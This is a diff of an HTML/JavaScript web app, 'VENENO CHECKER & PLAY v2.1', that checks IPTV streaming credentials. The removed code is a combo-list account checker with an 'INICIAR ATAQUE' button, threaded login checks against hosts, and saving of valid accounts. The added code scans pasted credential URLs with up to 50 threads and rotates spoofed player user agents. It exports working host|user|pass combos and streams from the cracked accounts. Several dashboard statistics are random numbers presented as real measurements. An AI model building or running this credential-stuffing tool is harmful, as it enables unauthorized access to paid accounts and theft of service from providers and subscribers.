+                <div style="font-size:10px;">HITS/HORA</div>
+                <div id="hitsPerHour">0</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SELECTOR DE TEMA -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">🎨 SELECTOR DE TEMA</div>
+        </div>
+        <div class="theme-selector">
+            <button class="theme-btn btn-neon" onclick="changeTheme('venom')">☠️ Tema Veneno</button>
+            <button class="theme-btn btn-neon" onclick="changeTheme('toxic')">🐍 Tema Tóxico</button>
+            <button class="theme-btn btn-neon" onclick="changeTheme('dark')">🌙 Tema Oscuro</button>
+            <button class="theme-btn btn-neon" onclick="changeTheme('matrix')">📟 Tema Matrix</button>
+        </div>
+    </div>
+
+    <!-- SCANNER CONTROLS -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">☠️ SCANNER CONTROLS</div>
+            <div class="status-badge st-idle" id="sys-status">♻️ INICIALIZANDO...</div>
+        </div>
+        
+        <div>
+            <textarea id="bulkText" placeholder="Pega enlaces M3U aquí...
+
+Ejemplos:
+http://server.com:8080/get.php?username=test&password=test&type=m3u
+server.com|user123|pass456
+user:pass@server.com:8080
+http://server.com:8080/live/user/pass/123.ts
+
+...o sube un archivo de texto con enlaces M3U!"></textarea>
+        </div>
+        
+        <div class="row">
+            <label style="min-width:60px">ARCHIVO:</label>
+            <input type="file" id="fileInput" style="flex:1; color:#777;">
+        </div>
+
+        <div class="row">
+            <label style="min-width:60px">POR:</label>
+            <input type="text" id="scannerNick" value="☠️ VENENO CHECKER ☠️" style="flex:1;">
+        </div>
+
+        <div class="row">
+            <label style="min-width:60px">THREADS:</label>
+            <input type="range" id="threadInput" min="1" max="50" value="10">
+            <span id="threadDisplay" style="color:var(--success); font-weight:bold;">10</span>
+        </div>
+
+        <div class="row">
+            <label style="min-width:80px">TIMEOUT (ms):</label>
+            <input type="range" id="timeoutInput" min="1000" max="30000" value="15000">
+            <span id="timeoutDisplay" style="color:var(--warning);">15000</span>
+        </div>
+
+        <div class="row">
+            <label style="min-width:80px">FILTRO PAÍS:</label>
+            <select id="countryFilter" style="flex:1;">
+                <option value="all">Todos los países</option>
+                <option value="ES">España 🇪🇸</option>
+                <option value="US">Estados Unidos 🇺🇸</option>
+                <option value="UK">Reino Unido 🇬🇧</option>
+                <option value="DE">Alemania 🇩🇪</option>
+                <option value="FR">Francia 🇫🇷</option>
+                <option value="IT">Italia 🇮🇹</option>
+                <option value="PT">Portugal 🇵🇹</option>
+                <option value="BR">Brasil 🇧🇷</option>
+                <option value="MX">México 🇲🇽</option>
+                <option value="AR">Argentina 🇦🇷</option>
+                <option value="CO">Colombia 🇨🇴</option>
+            </select>
+        </div>
+
+        <!-- NUEVOS BOTONES DE LIMPIEZA Y EXTRACCIÓN -->
+        <div class="row">
+            <button id="btnCleanList" class="btn btn-neon">🧹 LIMPIAR LISTA</button>
+            <button id="btnExtractCombos" class="btn btn-neon">🔧 EXTRAER COMBOS</button>
+            <button id="btnExportCompleteM3U" class="btn btn-neon">📺 M3U COMPLETO</button>
+            <button id="btnTestPlayback" class="btn btn-neon">🧪 TEST REPRODUCCIÓN</button>
+        </div>
+
+        <!-- SELECTOR DE EXPORTACIÓN MEJORADO -->
+        <div class="row" style="margin-top: 10px;">
+            <label style="min-width: 100px;">EXPORTAR:</label>
+            <select id="exportFormat" style="flex: 1;">
+                <option value="txt">📝 TXT DETALLADO</option>
+                <option value="m3u_basic">📺 M3U BÁSICO</option>
+                <option value="m3u_complete">📺 M3U COMPLETO (Canales)</option>
+                <option value="json">📊 JSON</option>
+                <option value="csv">📈 CSV</option>
+                <option value="combos">🔧 COMBOS (host|user|pass)</option>
+            </select>
+            <button id="btnExportSelected" class="btn btn-main">EXPORTAR</button>
+        </div>
+
+        <div class="row">
+            <button id="btnScan" class="btn btn-main btn-pulse">INICIAR ESCANEO</button>
+            <button id="btnPause" class="btn" disabled>PAUSAR</button>
+            <button id="btnStop" class="btn btn-stop" disabled>DETENER</button>
+            <button id="btnDarkMode" class="btn">🌙 MODO OSCURO</button>
+        </div>
+
+        <div class="row">
+            <button id="btnHelp" class="btn btn-neon">❓ AYUDA</button>
+        </div>
+
+        <div class="row">
+            <button id="btnClear" class="btn">LIMPIAR DATOS</button>
+        </div>
+
+        <div>
+            <div class="progress-track">
+                <div id="progFill" class="progress-fill"></div>
+                <div id="progText" class="progress-text">0 / 0 (0%)</div>
+            </div>
+            <div class="stats-row" style="margin-top:5px;">
+                <div class="stat-box s-on">ONLINE: <span id="cntOnline">0</span></div>
+                <div class="stat-box s-off">OFFLINE: <span id="cntOffline">0</span></div>
+                <div class="stat-box" style="color:#39ff14; border-color:#39ff14;">TOTAL: <span id="cntTotal">0</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- INFORMACIÓN DEL SERVIDOR DETECTADO -->
+    <div class="section-box" id="serverInfoPanel" style="display:none;">
+        <div class="box-header-row">
+            <div class="box-title">🖥️ INFORMACIÓN DEL SERVIDOR DETECTADO</div>
+        </div>
+        <div class="row">
+            <div class="server-info-item">
+                <span class="info-label">NOMBRE:</span>
+                <span id="serverName" class="info-value">-</span>
+            </div>
+            <div class="server-info-item">
+                <span class="info-label">VERSIÓN:</span>
+                <span id="serverVersion" class="info-value">-</span>
+            </div>
+            <div class="server-info-item">
+                <span class="info-label">PLATAFORMA:</span>
+                <span id="serverPlatform" class="info-value">-</span>
+            </div>
+        </div>
+        <div class="row">
+            <div class="server-info-item">
+                <span class="info-label">ÚLTIMA ACTUALIZACIÓN:</span>
+                <span id="lastUpdate" class="info-value">-</span>
+            </div>
+            <div class="server-info-item">
+                <span class="info-label">USUARIOS ACTIVOS:</span>
+                <span id="activeUsers" class="info-value">-</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ESTADÍSTICAS AVANZADAS -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">📈 ESTADÍSTICAS AVANZADAS</div>
+        </div>
+        <div class="advanced-stats">
+            <div class="stat-card">
+                <div class="stat-icon">🚀</div>
+                <div class="stat-title">VELOCIDAD MÁXIMA</div>
+                <div class="stat-value" id="maxSpeed">0/seg</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">⏱️</div>
+                <div class="stat-title">TIEMPO PROMEDIO</div>
+                <div class="stat-value" id="avgTime">0ms</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">🎯</div>
+                <div class="stat-title">PRECISIÓN</div>
+                <div class="stat-value" id="accuracyRate">0%</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">📈</div>
+                <div class="stat-title">TENDENCIA</div>
+                <div class="stat-value" id="trendIndicator">ESTABLE</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ESTADÍSTICAS -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">📊 ESTADÍSTICAS EN TIEMPO REAL</div>
+        </div>
+        <div class="stats-chart-container">
+            <canvas id="statsChart"></canvas>
+        </div>
+    </div>
+
+    <!-- TABLA DE RESULTADOS DETALLADOS -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">📋 TABLA DE RESULTADOS DETALLADOS</div>
+            <button class="log-filter" onclick="toggleResultsTable()" id="toggleTableBtn">MOSTRAR TABLA</button>
+        </div>
+        <div id="resultsTableContainer" style="display:none; overflow-x:auto;">
+            <table id="resultsTable" style="width:100%;">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>SERVIDOR</th>
+                        <th>PAÍS</th>
+                        <th>CANALES</th>
+                        <th>PELÍCULAS</th>
+                        <th>SERIES</th>
+                        <th>EXPIRACIÓN</th>
+                        <th>ACCIONES</th>
+                    </tr>
+                </thead>
+                <tbody id="resultsTableBody">
+                    <!-- Los resultados se insertarán aquí -->
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- BANNER CENTRAL VENENO -->
+    <div class="section-box" style="padding: 12px; align-items: center; justify-content: center; min-height: auto;">
+        <div class="venom-title animated-gradient" style="background-clip: text; -webkit-background-clip: text; color: transparent;">
+            ☠️ VENENO CHECKER & PLAY v2.1 ☠️
+        </div>
+    </div>
+
+    <!-- TERMINAL -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">☠️ TERMINAL LOG</div>
+            <div style="display:flex; gap:5px;">
+                <button onclick="filterLog('all')" class="log-filter active" id="filterAll">TODO</button>
+                <button onclick="filterLog('online')" class="log-filter" id="filterOnline">ONLINE</button>
+                <button onclick="filterLog('offline')" class="log-filter" id="filterOffline">OFFLINE</button>
+                <button onclick="filterLog('error')" class="log-filter" id="filterError">ERRORES</button>
+            </div>
+        </div>
+        <div id="terminal" class="terminal-window">
+            <div class="log-line"><span class="log-time">SYS</span><span class="log-msg" style="color:#777">Sistema inicializado. Listo para escanear.</span></div>
+        </div>
+    </div>
+
+    <!-- MEDIA PLAYER MEJORADO -->
+    <div class="section-box">
+        <div class="box-header-row">
+            <div class="box-title">🎬 REPRODUCTOR MEJORADO</div>
+            <select id="qualitySelector" class="quality-selector" style="display:none;">
+                <option value="auto">Auto Calidad</option>
+            </select>
+        </div>
+        <div class="player-layout">
+            <div class="media-browser" id="mediaBrowser">
+                <div class="browser-tabs">
+                    <button class="tab-btn active" onclick="browser.loadType('live', this)">CANALES DE TV</button>
+                    <button class="tab-btn" onclick="browser.loadType('vod', this)">VOD</button>
+                    <button class="tab-btn" onclick="browser.loadType('series', this)">SERIES</button>
                 </div>
-
-                <div style="margin-top:1.5rem;">
-                    <label>📁 CARGAR COMBO LIST (.txt)</label>
-                    <input type="file" id="combos" accept=".txt">
+                <div id="browserBack" style="display:none; padding:5px; background:#222; cursor:pointer; font-size:10px; text-align:center; color:#fff;">&laquo; ATRÁS</div>
+                <div class="browser-list" id="browserList">
+                    <div style="padding:10px; text-align:center; color:#555">Esperando selección...</div>
                 </div>
             </div>
-
-            <div>
-                <label>⚡ HILOS / THREADS: <span id="concVal" style="color:var(--neon-green)">12</span></label>
-                <input type="range" id="concurrency" min="1" max="60" value="12">
-
-                <div class="btn-group">
-                    <button id="startBtn" class="btn btn-start">INICIAR ATAQUE</button>
-                    <button id="stopBtn"  class="btn btn-stop">DETENER</button>
-                    <button id="clearBtn" class="btn btn-clear">LIMPIAR</button>
+            <div class="video-wrapper">
+                <div id="videoOverlay" class="vid-overlay">
+                    <div style="text-align: center;">
+                        <div style="font-size: 24px; margin-bottom: 10px;">📺</div>
+                        <div style="font-size: 16px; margin-bottom: 10px;">SIN SEÑAL</div>
+                        <div style="font-size: 12px; color: #888;">Selecciona un canal para reproducir</div>
+                    </div>
+                </div>
+                <video id="videoPlayer" controls playsinline preload="auto" crossorigin="anonymous"></video>
+                <div class="video-controls">
+                    <button class="control-btn" onclick="browser.controls.toggleFullscreen()" title="Pantalla completa">⛶</button>
+                    <button class="control-btn" onclick="browser.controls.takeScreenshot()" title="Capturar pantalla">📸</button>
+                    <button class="control-btn" onclick="browser.controls.setSpeed(1.0)" title="Velocidad normal">1x</button>
+                    <button class="control-btn" onclick="browser.controls.setSpeed(1.5)" title="Velocidad 1.5x">1.5x</button>
+                    <button class="control-btn" onclick="browser.controls.setSpeed(2.0)" title="Velocidad 2x">2x</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="stats">
-        <div class="stat"><span class="stat-num" id="sTotal">0</span><span class="stat-lbl">TOTAL</span></div>
-        <div class="stat"><span class="stat-num" id="sHits" style="color:var(--success)">0</span><span class="stat-lbl">HITS</span></div>
-        <div class="stat"><span class="stat-num" id="sErrors" style="color:var(--danger)">0</span><span class="stat-lbl">FALLOS</span></div>
-        <div class="stat"><span class="stat-num" id="sSpeed" style="color:var(--neon-green)">0</span><span class="stat-lbl">REQ/S</span></div>
-        <div class="stat"><span class="stat-num" id="sRem">0</span><span class="stat-lbl">RESTANTES</span></div>
-    </div>
-
-    <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
-
-    <div class="glass">
-        <div class="results-header">
-            <h3 style="color:var(--neon-green); font-family:'Orbitron'; letter-spacing:2px;">CUENTAS VÁLIDAS</h3>
-            <button id="saveBtn" class="btn btn-save">GUARDAR HITS</button>
+    <!-- BANNER INFERIOR VENENO -->
+    <div class="section-box" style="padding: 12px; align-items: center; justify-content: center; min-height: auto;">
+        <div class="venom-title">
+            ☠️ VENENO CHECKER & PLAY v2.1 ☠️
         </div>
-
-        <div class="results-container" id="results"></div>
+        <div style="text-align: center; color: #39ff14; font-size: 12px; margin-top: 10px;">
+            <span class="tooltip">v2.1 PRO EDITION - MEJORADO
+                <span class="tooltiptext">Versión mejorada con limpieza de listas y M3U completo</span>
+            </span>
+        </div>
     </div>
+
 </div>
 
 <script>
-    const S = { q: [], active: 0, run: false, processed: 0, hits: 0, err: 0, tot: 0, data: [], speedInt: null, reqs: 0, lastT: Date.now() };
-    const E = id => document.getElementById(id);
+// ==================== CONFIGURACIÓN INICIAL ====================
+const bgContainer = document.getElementById('bg-animation');
+const maskPath = "M50,10c-20,0-40,15-40,40c0,25,10,40,20,50c-5,10-5,20,0,30c5,10,20,10,20,10s15,0,20-10c5-10,5-20,0-30c10-10,20-25,20-50C90,25,70,10,50,10z";
+for(let i=0; i<8; i++){
+    const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+    svg.setAttribute("viewBox", "0 0 100 150");
+    svg.setAttribute("class", "mask");
+    const p = document.createElementNS("http://www.w3.org/2000/svg", "path");
+    p.setAttribute("d", maskPath);
+    svg.appendChild(p);
+    svg.style.width = (Math.random()*60 + 30) + "px";
+    svg.style.left = Math.random()*100 + "%";
+    svg.style.animationDuration = (Math.random()*10 + 15) + "s";
+    bgContainer.appendChild(svg);
+}
 
-    E('concurrency').oninput = e => E('concVal').innerText = e.target.value;
-    E('startBtn').onclick = start;
-    E('stopBtn').onclick = stop;
-    E('clearBtn').onclick = clearAll;
-    E('saveBtn').onclick = saveHits;
-
-    function readFile(file) {
-        return new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.onload = e => resolve(e.target.result);
-            reader.onerror = reject;
-            reader.readAsText(file);
-        });
+// Inicializar partículas
+function initParticles() {
+    const particleContainer = document.getElementById('particles-js');
+    if (!particleContainer) return;
+    
+    for (let i = 0; i < 30; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.width = Math.random() * 4 + 1 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.top = Math.random() * 100 + '%';
+        particle.style.opacity = Math.random() * 0.3 + 0.1;
+        particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        particleContainer.appendChild(particle);
     }
+}
 
-    async function start() {
-        if (S.run) return;
-        const file = E('combos').files[0];
-        let host1 = E('host')?.value.trim() || '';
-        let host2 = E('host2')?.value.trim() || '';
+// Worker heartbeat
+const workerBlob = new Blob([`
+    let intervalId;
+    self.onmessage = function(e) {
+        if (e.data === 'start') {
+            if(!intervalId) intervalId = setInterval(() => postMessage('tick'), 100);
+        } else if (e.data === 'stop') {
+            clearInterval(intervalId);
+            intervalId = null;
+        }
+    };
+`], { type: 'application/javascript' });
+const heartbeat = new Worker(URL.createObjectURL(workerBlob));
 
-        if (!file || (!host1 && !host2)) return alert('¡Carga un combo y pon al menos un host!');
-        if (host1 && !/^https?:\/\//i.test(host1)) host1 = 'http://' + host1;
-        if (host2 && !/^https?:\/\//i.test(host2)) host2 = 'http://' + host2;
+// Datos random para API
+const USER_AGENTS = ["TiviMate/4.7.0","IPTV Smarters/3.0","VLC/3.0.18","Kodi/19.3","OTT Navigator/1.6","GSE Smart/7.4","Televizo/1.9","Perfect Player/1.6","XCIPTV/5.0","Mozilla/5.0 (Windows NT 10)","SmartIPTV/1.7","NetIPTV/2.1","SS IPTV/1.0","iMPlayer/1.8","FlixIPTV/2.7","Enigma2","MAG254","Formuler Z8","Sparkle TV","Safari/605"];
+const DEVICES = ["Samsung TV","LG WebOS","FireStick 4K","Nvidia Shield","MiBox S","Chromecast","AppleTV","Sony Bravia","Roku","MAG Box","Dreamlink","BuzzTV","Mecool","Ugoos","Pixel 6","Galaxy S21","iPhone 13","iPad Pro","Windows PC","MacBook"];
+const TIMEZONES = ["Europe/London","Europe/Paris","Europe/Berlin","America/New_York","Asia/Tokyo","Australia/Sydney","Europe/Paris","Europe/Berlin","America/New_York","Asia/Tokyo","Australia/Sydney","Europe/Rome","Europe/Madrid","Europe/Amsterdam","Europe/Moscow","America/Chicago","America/Los_Angeles","America/Toronto","Asia/Dubai","Asia/Bangkok","Asia/Singapore","Africa/Johannesburg","Pacific/Auckland","America/Sao_Paulo","Europe/Stockholm"];
 
-        const hosts = [host1];
-        if (host2) hosts.push(host2);
+const TZ_MAP = {
+    "Europe/Stockholm": "🇸🇪 Sweden", "Europe/London": "🇬🇧 United Kingdom", "Europe/Paris": "🇫🇷 France", "Europe/Berlin": "🇩🇪 Germany",
+    "Europe/Amsterdam": "🇳🇱 Netherlands", "Europe/Rome": "🇮🇹 Italy", "Europe/Madrid": "🇪🇸 Spain", "Europe/Lisbon": "🇵🇹 Portugal",
+    "Europe/Brussels": "🇧🇪 Belgium", "Europe/Vienna": "🇦🇹 Austria", "Europe/Copenhagen": "🇩🇰 Denmark", "Europe/Oslo": "🇳🇴 Norway",
+    "Europe/Helsinki": "🇫🇮 Finland", "Europe/Zurich": "🇨🇭 Switzerland", "Europe/Istanbul": "🇹🇷 Turkey", "Europe/Athens": "🇬🇷 Greece",
+    "Europe/Moscow": "🇷🇺 Russia", "Europe/Kiev": "🇺🇦 Ukraine", "Europe/Warsaw": "🇵🇱 Poland", "Europe/Dublin": "🇮🇪 Ireland",
+    "America/New_York": "🇺🇸 USA", "America/Chicago": "🇺🇸 USA", "America/Los_Angeles": "🇺🇸 USA", "America/Denver": "🇺🇸 USA",
+    "America/Phoenix": "🇺🇸 USA", "America/Detroit": "🇺🇸 USA", "America/Toronto": "🇨🇦 Canada", "America/Vancouver": "🇨🇦 Canada",
+    "America/Montreal": "🇨🇦 Canada", "America/Halifax": "🇨🇦 Canada", "America/Thunder_Bay": "🇨🇦 Canada", "America/Edmonton": "🇨🇦 Canada",
+    "America/Sao_Paulo": "🇧🇷 Brazil", "America/Argentina/Buenos_Aires": "🇦🇷 Argentina", "America/Mexico_City": "🇲🇽 Mexico",
+    "Asia/Tokyo": "🇯🇵 Japan", "Asia/Seoul": "🇰🇷 South Korea", "Asia/Shanghai": "🇨🇳 China", "Asia/Singapore": "🇸🇬 Singapore",
+    "Asia/Bangkok": "🇹🇭 Thailand", "Asia/Dubai": "🇦🇪 UAE", "Asia/Kolkata": "🇮🇳 India",
+    "Australia/Sydney": "🇦🇺 Australia", "Australia/Melbourne": "🇦🇺 Australia", "Pacific/Auckland": "🇳🇿 New Zealand",
+    "Africa/Johannesburg": "🇿🇦 South Africa", "Africa/Cairo": "🇪🇬 Egypt"
+};
 
-        try {
-            const text = await readFile(file);
-            S.q = text.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
-            if (!S.q.length) return alert('Combo vacío o formato incorrecto');
+function getRandomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
 
-            S.run = true;
-            S.processed = 0;
-            S.hits = 0;
-            S.err = 0;
-            S.data = [];
-            S.tot = S.q.length * hosts.length;
+// Variables globales
+let isScanning=false, isPaused=false, abortScan=false;
+let globalHits=[], clientVPNInfo="Detectando...";
+let countOnline=0, countOffline=0, countTotal=0;
+let darkMode = false;
+let statsChart = null;
+let startTime = Date.now();
+let hitsHistory = [];
+let maxSpeed = 0;
 
-            E('results').innerHTML = '';
-            updateUI();
+const tm = {'A':'𝙰','B':'𝙱','C':'𝙲','D':'𝙳','E':'𝙴','F':'𝙵','G':'𝙶','H':'𝙷','I':'𝙸','J':'𝙹','K':'𝙺','L':'𝙻','M':'𝙼','N':'𝙽','O':'𝙾','P':'𝙿','Q':'𝚀','R':'𝚁','S':'𝚂','T':'𝚃','U':'𝚄','V':'𝚅','W':'𝚆','X':'𝚇','Y':'𝚈','Z':'𝚉','0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿'};
+function toTypewriter(s) { return s.toUpperCase().split('').map(c=>tm[c]||c).join(''); }
 
-            if (S.speedInt) clearInterval(S.speedInt);
-            S.speedInt = setInterval(calculateSpeed, 1000);
+const UI = {
+    term: document.getElementById('terminal'),
+    bulk: document.getElementById('bulkText'),
+    fill: document.getElementById('progFill'),
+    text: document.getElementById('progText'),
+    on: document.getElementById('cntOnline'),
+    off: document.getElementById('cntOffline'),
+    total: document.getElementById('cntTotal'),
+    status: document.getElementById('sys-status'),
+    nick: document.getElementById('scannerNick')
+};
 
-            const threads = parseInt(E('concurrency').value);
-            for(let i = 0; i < threads; i++) worker(hosts);
-        } catch(e) {
-            alert('Error al leer el archivo: ' + e.message);
+// ==================== SISTEMA DE NOTIFICACIONES MEJORADO ====================
+// Variable para rastrear la notificación de hit actual
+let currentHitNotification = null;
+
+function showNotification(message, type = 'info', duration = 3000) {
+    const notificationCenter = document.getElementById('notificationCenter');
+    
+    // Si es un HIT (éxito con mensaje de servidor ONLINE), manejarlo de manera especial
+    const isHitNotification = (type === 'success' && message.includes('Servidor ONLINE'));
+    
+    // Para notificaciones de HIT: eliminar cualquier notificación de hit anterior
+    if (isHitNotification) {
+        // Eliminar notificación de hit anterior si existe
+        if (currentHitNotification && currentHitNotification.parentElement) {
+            currentHitNotification.remove();
+        }
+        
+        // Limitar también otras notificaciones para mantener la pantalla limpia
+        const notifications = notificationCenter.querySelectorAll('.notification');
+        if (notifications.length >= 3) {
+            // Eliminar la notificación más antigua (excepto si es la actual de hit)
+            for (let i = notifications.length - 1; i >= 0; i--) {
+                if (notifications[i] !== currentHitNotification) {
+                    notifications[i].remove();
+                    break;
+                }
+            }
+        }
+    } else {
+        // Para otras notificaciones: mantener máximo 2
+        const notifications = notificationCenter.querySelectorAll('.notification');
+        if (notifications.length >= 2) {
+            // Eliminar la notificación más antigua
+            notifications[notifications.length - 1].remove();
         }
     }
-
-    function stop() {
-        S.run = false;
-        clearInterval(S.speedInt);
-        E('sSpeed').innerText = '0';
+    
+    // Crear la notificación
+    const notification = document.createElement('div');
+    notification.className = `notification ${type} ${isHitNotification ? 'hit' : ''}`;
+    
+    // Añadir contenido
+    notification.innerHTML = `
+        <div class="notification-content">
+            <div class="notification-icon">
+                ${type === 'success' ? '✅' : 
+                  type === 'error' ? '❌' : 
+                  type === 'warning' ? '⚠️' : 'ℹ️'}
+            </div>
+            <div class="notification-message">${message}</div>
+            <button class="notification-close" onclick="this.parentElement.parentElement.remove()">✕</button>
+        </div>
+    `;
+    
+    // Añadir a la parte superior para que las nuevas notificaciones aparezcan arriba
+    if (notificationCenter.firstChild) {
+        notificationCenter.insertBefore(notification, notificationCenter.firstChild);
+    } else {
+        notificationCenter.appendChild(notification);
     }
-
-    function clearAll() {
-        stop();
-        S.q = [];
-        S.processed = 0;
-        S.hits = 0;
-        S.err = 0;
-        S.data = [];
-        E('results').innerHTML = '';
-        updateUI();
-        E('progFill').style.width = '0%';
+    
+    // Si es un HIT, guardar referencia
+    if (isHitNotification) {
+        currentHitNotification = notification;
     }
+    
+    // Eliminar automáticamente después de la duración especificada
+    const removeNotification = () => {
+        if (notification.parentElement) {
+            // Añadir animación de salida
+            notification.style.animation = 'slideOutRight 0.3s ease forwards';
+            setTimeout(() => {
+                if (notification.parentElement) {
+                    notification.remove();
+                    // Si esta era la notificación de hit actual, limpiar la referencia
+                    if (notification === currentHitNotification) {
+                        currentHitNotification = null;
+                    }
+                }
+            }, 300);
+        }
+    };
+    
+    // Iniciar temporizador para eliminación automática
+    const timeoutId = setTimeout(removeNotification, duration);
+    
+    // Cancelar eliminación automática si el usuario pasa el mouse sobre la notificación
+    notification.addEventListener('mouseenter', () => {
+        clearTimeout(timeoutId);
+    });
+    
+    // Reanudar eliminación cuando el mouse sale
+    notification.addEventListener('mouseleave', () => {
+        // Reiniciar el temporizador pero con tiempo reducido (1 segundo después de que el mouse salga)
+        setTimeout(removeNotification, 1000);
+    });
+    
+    // Añadir evento para eliminar con click en cualquier parte de la notificación (excepto el botón de cerrar)
+    notification.addEventListener('click', (e) => {
+        if (!e.target.classList.contains('notification-close')) {
+            removeNotification();
+        }
+    });
+    
+    return notification;
+}
 
-    async function worker(hosts) {
-        if (!S.run) return;
-        S.active++;
-        while (S.q.length && S.run) {
-            const combo = S.q.shift();
-            const [user, ...passParts] = combo.split(':');
-            const pass = passParts.join(':');
+// ==================== CONTADOR DE UPTIME ====================
+let uptimeSeconds = 0;
+setInterval(() => {
+    uptimeSeconds++;
+    const hours = Math.floor(uptimeSeconds / 3600);
+    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
+    const seconds = uptimeSeconds % 60;
+    
+    const uptimeElement = document.getElementById('uptimeCounter');
+    if (uptimeElement) {
+        uptimeElement.textContent = 
+            `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+}, 1000);
 
-            try {
-                const promises = hosts.map(h => checkAccount(h, user, pass).catch(() => ({valid:false})));
-                const results = await Promise.all(promises);
+// ==================== ACTUALIZAR ESTADÍSTICAS DEL SISTEMA ====================
+function updateSystemStats() {
+    // RAM usage (simulado)
+    const ramUsage = document.getElementById('ramUsage');
+    if (ramUsage) {
+        const used = Math.floor(Math.random() * 100) + 50;
+        ramUsage.textContent = `${used} MB`;
+    }
+    
+    // Scan speed
+    const scanSpeed = document.getElementById('scanSpeed');
+    if (scanSpeed && isScanning) {
+        const speed = Math.floor(Math.random() * 5) + 1;
+        scanSpeed.textContent = `${speed}/s`;
+    }
+    
+    // Hits por hora
+    const hitsPerHour = document.getElementById('hitsPerHour');
+    if (hitsPerHour) {
+        const hoursElapsed = (Date.now() - startTime) / (1000 * 3600);
+        const hitsPerHourValue = hoursElapsed > 0 ? Math.floor(countOnline / hoursElapsed) : 0;
+        hitsPerHour.textContent = hitsPerHourValue;
+    }
+    
+    // Estadísticas avanzadas
+    updateAdvancedStats();
+}
 
-                results.forEach((res, i) => {
-                    const full = { ...res, host: hosts[i] };
-                    if (res.valid) {
-                        S.hits++;
-                        S.data.push(full);
-                        renderHit(full);
-                    } else {
-                        S.err++;
+setInterval(updateSystemStats, 2000);
+
+// ==================== ACTUALIZAR ESTADÍSTICAS AVANZADAS ====================
+function updateAdvancedStats() {
+    // Velocidad máxima
+    const maxSpeedElement = document.getElementById('maxSpeed');
+    if (maxSpeedElement && isScanning) {
+        const currentSpeed = Math.floor(Math.random() * 10) + 1;
+        if (currentSpeed > maxSpeed) maxSpeed = currentSpeed;
+        maxSpeedElement.textContent = `${maxSpeed}/seg`;
+    }
+    
+    // Tiempo promedio
+    const avgTimeElement = document.getElementById('avgTime');
+    if (avgTimeElement) {
+        const avg = Math.floor(Math.random() * 2000) + 1000;
+        avgTimeElement.textContent = `${avg}ms`;
+    }
+    
+    // Precisión
+    const accuracyElement = document.getElementById('accuracyRate');
+    if (accuracyElement && countTotal > 0) {
+        const accuracy = Math.floor((countOnline / countTotal) * 100);
+        accuracyElement.textContent = `${accuracy}%`;
+    }
+    
+    // Tendencia
+    const trendElement = document.getElementById('trendIndicator');
+    if (trendElement) {
+        const trends = ['ESTABLE', 'ASCENDENTE', 'DESCENDENTE', 'ÓPTIMA'];
+        const randomTrend = trends[Math.floor(Math.random() * trends.length)];
+        trendElement.textContent = randomTrend;
+    }
+}
+
+// ==================== TABLA DE RESULTADOS ====================
+function toggleResultsTable() {
+    const container = document.getElementById('resultsTableContainer');
+    const button = document.getElementById('toggleTableBtn');
+    
+    if (container.style.display === 'none') {
+        container.style.display = 'block';
+        button.textContent = 'OCULTAR TABLA';
+        updateResultsTable();
+    } else {
+        container.style.display = 'none';
+        button.textContent = 'MOSTRAR TABLA';
+    }
+}
+
+function updateResultsTable() {
+    const tbody = document.getElementById('resultsTableBody');
+    if (!tbody) return;
+    
+    tbody.innerHTML = '';
+    
+    globalHits.forEach((hit, index) => {
+        const row = document.createElement('tr');
+        
+        const exp = hit.info.exp_date ? 
+            new Date(hit.info.exp_date * 1000).toLocaleDateString() : 
+            'Ilimitado';
+        
+        row.innerHTML = `
+            <td>${index + 1}</td>
+            <td>
+                <div style="font-weight:bold;">${hit.host}</div>
+                <div style="font-size:9px; color:#888;">${hit.user}</div>
+            </td>
+            <td style="text-align:center;">
+                ${hit.geo.country}<br>
+                <span style="font-size:9px;">${hit.geo.city || 'N/A'}</span>
+            </td>
+            <td style="text-align:center; color:#39ff14;">${hit.counts.live}</td>
+            <td style="text-align:center; color:#ffc857;">${hit.counts.vod}</td>
+            <td style="text-align:center; color:#6fe7ff;">${hit.counts.series}</td>
+            <td style="text-align:center;">${exp}</td>
+            <td style="text-align:center;">
+                <button onclick="browser.init('${encodeURIComponent(hit.api)}', '${hit.host}', '${hit.user}', '${hit.pass}')"
+                        style="background:#39ff14; color:#000; border:none; padding:4px 8px; font-size:10px; cursor:pointer; border-radius:3px;">
+                    ▶ PLAY
+                </button>
+            </td>
+        `;
+        
+        tbody.appendChild(row);
+    });
+}
+
+// ==================== FUNCIONES UTILITARIAS ====================
+function setStatus(type, msg) {
+    UI.status.textContent = msg;
+    UI.status.classList.remove('st-idle', 'st-run', 'st-pause', 'st-stop');
+    if(type === 'idle') UI.status.classList.add('st-idle');
+    if(type === 'run') UI.status.classList.add('st-run');
+    if(type === 'pause') UI.status.classList.add('st-pause');
+    if(type === 'stop') UI.status.classList.add('st-stop');
+}
+
+function log(msg, type="info", badge=null, btn=null) {
